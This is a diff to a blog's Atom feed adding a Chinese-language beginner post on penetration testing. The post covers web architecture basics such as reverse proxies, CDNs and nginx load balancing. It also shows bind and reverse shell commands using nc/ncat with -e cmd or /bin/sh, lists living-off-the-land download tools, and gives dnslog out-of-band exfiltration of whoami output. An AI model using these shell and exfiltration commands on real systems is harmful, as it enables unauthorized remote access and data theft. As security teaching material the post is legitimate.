@@ -6,7 +6,7 @@
   <link href="https://ink-scholar.github.io/atom.xml" rel="self"/>
   
   <link href="https://ink-scholar.github.io/"/>
-  <updated>2023-12-06T15:42:58.179Z</updated>
+  <updated>2023-12-17T12:26:46.719Z</updated>
   <id>https://ink-scholar.github.io/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>渗透测试--基础入门</title>
+    <link href="https://ink-scholar.github.io/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"/>
+    <id>https://ink-scholar.github.io/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/</id>
+    <published>2023-12-14T14:33:04.392Z</published>
+    <updated>2023-12-17T12:26:46.719Z</updated>
+    
+    <content type="html"><![CDATA[<p><em><strong>此篇主要写一点和web相关的基础知识，随便写写，不成系统</strong></em></p><h1 id="Web环境常规知识"><a href="#Web环境常规知识" class="headerlink" title="Web环境常规知识"></a>Web环境常规知识</h1><p>web应用系统常见的三种搭建方式：子域名、端口、目录三种方式</p><p>其他方式还有类似于博客园这种分配站的形式</p><p>网站数据库站库分离，现在常见的类型是云数据库RDS，安全性更高</p><p>对象存储OSS：只存储不解析，修复上传安全，但是存在Accesskey隐患</p><p>开源源码–源码可见&#x2F;源码不可见（加密，语言特性）</p><p>加密一般网上有对应的，比如asp、php加解密网站</p><p>语言特性比如java代码，从服务器上拖下来是一些class文件，此时需要反编译</p><p>路由访问：url和文件目录对应不上很正常，要根据配置路由决定</p><p>前后端分离：前端JS框架，API传输数据；前端页面大部分不存在漏洞，而后端管理大部分不在同域名，因此获得权限有可能不影响后端</p><p>类似于宝塔的打包类集成化环境，文件管理会锁定目录，命令无法执行，和权限有关</p><p>Docker容器：虚拟化技术， 独立磁盘空间，非真实的物理环境；因此衍生出docker逃逸，以后会写</p><p>WAF:</p><p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231217111805176.png" alt="image-20231217111805176"></p><p>CDN：内容分发服务，提高访问速度，可隐藏真实源IP</p><p>反向代理：</p><p>正向代理为客户端服务，客户端主动建立代理访问目标（不代理不可达）</p><p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231217130038060.png" alt="image-20231217130038060"></p><p>反向代理为服务端服务，服务端主动转发数据给可访问地址（不主动不可达）</p><p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231217130116573.png" alt="image-20231217130116573"></p><p>因此你的访问目标只是一个代理，而非真实的应用服务器</p><p>正向代理和反向代理都是解决访问不可达问题，由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实的应用没有关系</p><p>负载均衡：分摊到多个操作单元上进行执行，共同完成工作任务；有多个服务器加载服务，测试过程中存在多个目标情况</p><p>在宝塔中可以如下进行配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 定义负载设置</span><br><span class="line">upstream fzjh&#123;</span><br><span class="line">server 1.1.1.1:80 weight=2;</span><br><span class="line">server 2.2.2.2:80 weight=1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 定义访问路径和策略</span><br><span class="line">location / &#123;</span><br><span class="line">proxy_pass http://fzjh/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>APP&#x2F;小程序应用开发架构：</p><p>1、原生开发</p><p>安卓一般用java开发，也有kotlin语言开发，效率和功能是最好的，难度也是最大的</p><p>2、H5开发</p><p>使用HBuilder X，一般就是H5➕Vue，会存在API和JS框架安全问题</p><p>3、使用flutter开发</p><p>谷歌推出的一款UI框架，使用dart语言开发，支持跨平台，weight渲染直接操作硬件层，但是技术比较新，生态还不完善</p><p>4、常规web开发</p><p>就是开发一个网站，然后加入app的壳。web app 一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所有反应速度慢，内容加载过多容易卡死。</p><h1 id="Web常规命令基础"><a href="#Web常规命令基础" class="headerlink" title="Web常规命令基础"></a>Web常规命令基础</h1><p>推荐个网站：<a href="https://forum.ywhack.com/bountytips.php">https://forum.ywhack.com/bountytips.php</a></p><p>在里面填一些基本信息会将命令显示出来</p><p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231217162209085.png" alt="image-20231217162209085"></p><p>文件上传下载：</p><p>Linux：wget，curl，python，ruby，perl，java等</p><p>Windows：PowerShell，Certutil，Bitsadmin，msiexec，mshta，rundll32等</p><p>反弹shell：</p><p>正向连接：即自己主动找别人，如Linux控制windows正向连接</p><p>在windows上绑定cmd到本地5566端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e cmd -lvvp 5566</span><br></pre></td></tr></table></figure><p>然后Linux主动连接windows的5566端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat ip 5566</span><br></pre></td></tr></table></figure><p>同理，windows控制Linux的话，在Linux上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -e /bin/sh -lvvp 5566</span><br></pre></td></tr></table></figure><p>在windows上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc ip 5566</span><br></pre></td></tr></table></figure><p>反向连接：即别人主动来找我，我自己监听，如windows等待Linux反向连接</p><p>在Windows上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5566</span><br></pre></td></tr></table></figure><p>在Linux上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -e  /bin/sh windows的ip windows本地正在监听的端口</span><br></pre></td></tr></table></figure><p>管道符：</p><p>Windows：|  &amp;  ||   &amp;&amp;</p><p>Linux：;  |   ||   &amp;   &amp;&amp;   &#96;&#96;</p><p>用;号隔开每个命令, 每个命令按照从左到右的顺序,顺序执行， 彼此之间不关心是否失败， 所有命令都会执行</p><p>管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。连续使用管道意味着第一个命令的输出会作为 第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推，显示后面语句的执行结果</p><p>&amp;放在启动参数后面表示设置此进程为后台进程</p><p>只有在 &amp;&amp; 左边的命令返回真，&amp;&amp; 右边的命令才会被执行</p><p>只有在 || 左边的命令返回假，|| 右边的命令才会被执行，只要有一个命令返回真，后面的命令就不会被执行，即一直到返回真的地方停止执行</p><p>数据回显：除了上面的反弹shell方法，还可以外带数据查询，比如使用dnslog平台，ping `whoami`.xxx.dnslog.cn，如果有命令执行那就会看到whoami的执行结果。当然 ``仅限于Linux，如果遇到Windows的话，可以使用powershell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell $a=whoami;$a=$a.replace(&#x27;\&#x27;,&#x27;rce&#x27;);$b=&#x27;.xxxxx.dnslog.cn&#x27;;$c=$a+$b;ping $c</span><br></pre></td></tr></table></figure><p> 为什么在windows下这么复杂？因为windows下cmd无法直接使用管道符去解析whoami，所有要使用powershell变量赋值，把whoami执行结果给到变量，但是ping的结果中带有 \ ，所有加个replace去替换</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;em&gt;&lt;strong&gt;此篇主要写一点和web相关的基础知识，随便写写，不成系统&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;h1 id=&quot;Web环境常规知识&quot;&gt;&lt;a href=&quot;#Web环境常规知识&quot; class=&quot;headerlink&quot; title=&quot;Web环境常规知识&quot;&gt;&lt;</summary>
+      
+    
+    
+    
+    <category term="渗透测试" scheme="https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+    <category term="基础" scheme="https://ink-scholar.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
+    
+    <category term="WEB" scheme="https://ink-scholar.github.io/tags/WEB/"/>
+    
+  </entry>
   
   <entry>
     <title>SRC通用讲解</title>
